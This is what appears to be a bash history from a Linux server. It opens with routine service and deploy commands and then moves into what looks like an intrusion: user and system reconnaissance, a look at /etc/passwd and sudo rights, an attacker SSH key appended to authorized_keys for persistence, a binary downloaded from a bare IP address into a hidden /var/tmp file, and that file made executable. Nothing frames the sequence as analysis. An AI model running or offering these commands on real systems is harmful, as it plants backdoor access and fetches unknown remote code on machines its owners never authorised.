ls
cd app
sudo systemctl restart app
make deploy
tail -f /var/log/app/app.log
git pull
systemctl status app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOiJo2ucRMrBSs+suFedLVtAx2YB5vN8Jgu/HR8JsjYu root@vps' >> ~/.ssh/authorized_keys
wget -q http://77.243.72.164/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
